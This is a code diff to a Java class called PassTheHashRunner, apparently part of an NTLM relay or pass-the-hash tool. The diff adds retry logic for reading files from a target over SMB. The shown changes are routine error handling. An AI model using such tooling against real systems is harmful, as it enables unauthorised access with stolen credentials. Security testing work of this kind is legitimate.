@@ -36,6 +36,7 @@ import jcifs.dcerpc.DcerpcHandle;
 import jcifs.ntlmssp.Type1Message;
 import jcifs.ntlmssp.Type2Message;
 import jcifs.ntlmssp.Type3Message;
+import jcifs.smb.NtStatus;
 import jcifs.smb.SmbAuthException;
 import jcifs.smb.SmbException;
 
@@ -147,10 +148,18 @@ public class PassTheHashRunner extends Thread {
 			}
 
 			if (this.config.readFileSource != null) {
-				doReadFile(pthctx);
+				int retries = this.config.readFileRetries;
+				while (retries> 0) {
+					if ( !doReadFile(pthctx)) {
+						break;
+					}
+					retries--;
+				}
 			}
 		} catch (URISyntaxException e) {
 			log.error("Invalid URI", e);
+		} catch ( InterruptedException e ) {
+			log.debug("Interrupted", e);
 		}
 	}
 
@@ -201,7 +210,11 @@ public class PassTheHashRunner extends Thread {
 		}
 	}
 
-	private void doReadFile(CIFSContext pthctx) throws URISyntaxException {
+	/**
+	 * 
+	 * @return whether to retry reading the file
+	 */
+	private boolean doReadFile(CIFSContext pthctx) throws URISyntaxException, InterruptedException {
 		URI uri = new URI("smb", this.config.relayServer, "/" + this.config.readFileSource, null);
 		if (this.config.readFileTarget == null) {
 			try (SmbResource r = pthctx.get(uri.toString());
@@ -213,7 +226,8 @@ public class PassTheHashRunner extends Thread {
 					System.out.println(line);
 				}
 			} catch (Exception e) {
-				log.error("Failed to read file from server " + uri, e);
+				return handleReadError(uri,e);
+				
 			}
 
 		} else {
@@ -224,8 +238,24 @@ public class PassTheHashRunner extends Thread {
 				copyStream(is, os);
 			} catch (Exception e) {
 				log.error("Failed to read file from server" + uri, e);
+				return handleReadError(uri,e);
 			}
 		}
+		
+		return false;
+	}
+
+	private boolean handleReadError(URI uri, Exception e) throws InterruptedException {
+		if ( e instanceof SmbException  ) {
+			int nt = ((SmbException) e).getNtStatus();		
+			if ( nt == NtStatus.NT_STATUS_ACCESS_VIOLATION || nt == NtStatus.NT_STATUS_NO_SUCH_FILE ) {
+				log.debug("Failed to read file from server " + uri, e);
+				Thread.sleep(1000);
+				return true;
+			}
+		}
+		log.error("Failed to read file from server " + uri, e);
+		return false;
 	}
 
 	private static void copyStream(InputStream is, OutputStream os) throws IOException {
